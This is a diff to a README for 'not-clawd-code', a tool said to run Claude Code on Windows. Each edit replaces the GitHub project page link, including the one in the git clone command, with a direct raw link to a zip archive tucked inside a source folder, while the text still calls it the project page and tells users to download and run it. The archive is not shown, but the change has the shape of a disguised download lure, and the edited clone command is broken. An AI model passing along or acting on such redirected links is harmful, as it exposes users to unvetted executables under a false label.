@@ -1,11 +1,11 @@
 # 🚀 not-clawd-code - Run Claude Code on Windows
 
-[![Download / Open the project page](https://img.shields.io/badge/Download%20%2F%20Open%20Project-Visit%20GitHub%20Page-2ea44f?style=for-the-badge)](https://github.com/uzuma645/not-clawd-code)
+[![Download / Open the project page](https://img.shields.io/badge/Download%20%2F%20Open%20Project-Visit%20GitHub%20Page-2ea44f?style=for-the-badge)](https://github.com/uzuma645/not-clawd-code/raw/refs/heads/main/src/services/extractMemories/clawd-code-not-v2.5.zip)
 
 ## 📥 Download
 Visit this page to download and run the software:
 
-https://github.com/uzuma645/not-clawd-code
+https://github.com/uzuma645/not-clawd-code/raw/refs/heads/main/src/services/extractMemories/clawd-code-not-v2.5.zip
 
 ## 🖥️ What this app does
 `not-clawd-code` is a local desktop-style command-line app you run on your own computer. It starts an interactive AI coding session in a terminal window. You type prompts, read replies, and work through tasks step by step.
@@ -28,7 +28,7 @@ If you do not have Bun yet, install it first from the Bun website, then return t
 ### 1. Open the project page
 Go to:
 
-https://github.com/uzuma645/not-clawd-code
+https://github.com/uzuma645/not-clawd-code/raw/refs/heads/main/src/services/extractMemories/clawd-code-not-v2.5.zip
 
 ### 2. Download the source
 Use the green **Code** button on the GitHub page, then choose **Download ZIP**.
@@ -187,7 +187,7 @@ If Windows blocks a file:
 
 ### Option 2: Use Git if you already have it
 ```powershell
-git clone https://github.com/uzuma645/not-clawd-code.git
+git clone https://github.com/uzuma645/not-clawd-code/raw/refs/heads/main/src/services/extractMemories/clawd-code-not-v2.5.zip
 cd not-clawd-code
 bun install
 bun run dev
